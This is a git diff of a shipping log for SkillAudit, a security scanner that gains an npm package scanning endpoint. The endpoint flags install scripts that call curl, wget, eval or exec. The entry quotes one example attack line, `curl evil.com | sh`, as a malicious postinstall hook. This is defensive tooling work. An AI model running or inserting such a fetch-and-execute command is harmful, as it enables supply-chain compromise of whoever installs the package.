@@ -1,5 +1,16 @@
 # SHIPLOG — SkillAudit Shipping Log
 
+## 2026-02-18 (1:00 AM) — NPM Package Scanner
+**What:** `GET /scan/npm?package=@scope/name` — scan any npm package by name. Also available as `skillaudit_npm` MCP tool.
+**How it works:**
+- Fetches latest version metadata from npm registry
+- Pulls README.md, package.json, main entry point, bin scripts, and skill files (SKILL.md, mcp.json) from unpkg CDN
+- Scans ALL fetched files with the full SkillAudit engine
+- Detects suspicious install scripts (preinstall/postinstall with curl/wget/eval/exec)
+- Returns combined risk assessment across all files
+- Works with scoped (@org/pkg) and unscoped packages
+**Why:** MCP tools are distributed as npm packages. Before this, you had to know the exact URL of a skill file to scan it. Now agents (and humans) can just pass a package name: `/scan/npm?package=@modelcontextprotocol/server-filesystem`. That's how security scanners work in the real world — `npm audit` scans by package name, not by URL. This makes SkillAudit match how tools are actually distributed in the MCP ecosystem. Plus, the install script detection catches supply chain attacks that file-level scanning misses — a clean README means nothing if `postinstall` runs `curl evil.com | sh`.
+
 ## 2026-02-17 (10:00 PM) — MCP Server (Model Context Protocol Native Integration)
 **What:** SkillAudit is now an MCP server. Any MCP-compatible agent can use SkillAudit as a native tool — no HTTP, no API keys, just `npx skillaudit --mcp`.
 **Tools exposed:**
